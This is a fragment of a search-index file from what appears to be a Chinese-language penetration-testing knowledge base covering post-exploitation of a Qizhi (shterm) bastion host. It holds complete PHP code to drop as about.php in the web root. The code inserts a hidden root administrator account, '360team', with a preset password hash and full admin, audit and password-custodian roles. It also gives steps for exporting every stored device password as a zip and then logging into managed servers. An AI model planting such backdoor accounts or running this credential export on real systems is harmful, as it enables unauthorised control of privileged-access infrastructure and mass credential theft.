?>","title":"\u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_13","text":"\u5982\u679c\u7ba1\u7406\u5458\u5bc6\u7801\u5b9e\u5728\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5c31\u65b0\u5efa\u4e00\u4e2a\u5427\u3002 \u5728 /icons/tui/ \u76ee\u5f55\u4e0b\u65b0\u5efa about.php \u6587\u4ef6 \u7528\u6237\u540d\uff1a 360team \u5bc6\u7801\uff1a shterm <?PHP $CONFIG[\"nomenu\"] = true; $CONFIG[\"nochangepw\"] = true; require_once(\"/var/www/shterm/include/common.php\"); $q2 = pg_escape(\"INSERT INTO identity(id,status,login,name,company,department,domain,post,number,email,mobile,auth_method,auth_data,x509_dn,auth,passwd_salt,passwd_sha1,passwd_expire,passwd_change,ipaddr_limit,crypt_passwd,pgp_pubkey,role_admin,role_manager,role_audit,role_shell,role_pwrcpt,default_dept,valid_date1,valid_date2,create_stamp,modify_stamp,create_identity,lastlogin_stamp,tui_client,server_grid_way,remark,theme,client_tuires,client_guires,totp_params,challenge_message,challenge_state,options,attrs,perms) VALUES(100900,'1','360team','360team','','ROOT','1','','','','','1','{\\\"hash\\\": \\\"9a15a976afaefb1d3e1ac21f62be336e2054c3d0\\\", \\\"times\\\": 1, \\\"expire\\\": \\\"\\\", \\\"algo\\\": \\\"shterm1\\\", \\\"salt\\\": \\\"nukj4rT0aa\\\", \\\"change\\\": false}','','native','','',null,null,'','','',1,1,1,1,1,null,null,null,null,'2023-01-13 10:44:17.965318',null,'2023-01-16 13:14:47.295477','','','','','','','','','','{\\\"perms\\\":\\\"\\\"}','','{\\\"manager\\\":[1],\\\"audit\\\":[1],\\\"pwrcpt\\\":[1]}')\"); $r2 = pg_fetch_assoc($q2); echo \"\u65b0\u589e\u7528\u6237\u6210\u529f\";","title":"\u65b0\u5efa\u7ba1\u7406\u5458"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/#_14","text":"\u9996\u5148\u628a\u8d26\u6237\u5f04\u6210\u5bc6\u7801\u4fdd\u7ba1\u5458\u6743\u9650\u3002 \u7136\u540e\u70b9\u51fb\u8d26\u6237\u8bbe\u7f6e\u2192\u4fee\u6539\u8bbe\u7f6e\uff08\u8f93\u5165\u7528\u6237\u7684\u767b\u5f55\u5bc6\u7801\uff09\u2192zip\u6587\u4ef6\u5bc6\u7801\u8bbe\u7f6ezip\u89e3\u538b\u5bc6\u7801\u3002 \u7136\u540e\u5bc6\u7801\u63a7\u5236\u2192\u5bc6\u7801\u5907\u4efd\u5373\u53ef\u5bfc\u51fa\u4e00\u4efd\u5bc6\u7801\u672czip\uff0c\u89e3\u538b\u5bc6\u7801\u4e3a\u521a\u521a\u8bbe\u7f6e\u597d\u7684zip\u89e3\u538b\u5bc6\u7801\u3002 \u5982\u679c\u8981\u8fde\u63a5\u8bbe\u5907\uff0c\u53ef\u4ee5\u76f4\u63a5ssh\u6216\u8005rdp\u4e0a\u53bb\u8fde\uff0c\u7528\u6237\u5bc6\u7801\u4e3a\u5821\u5792\u673aweb\u670d\u52a1\u7684\u7528\u6237\u5bc6\u7801.","title":"\u8bbe\u5907\u5bc6\u7801\u5bfc\u51fa"}]}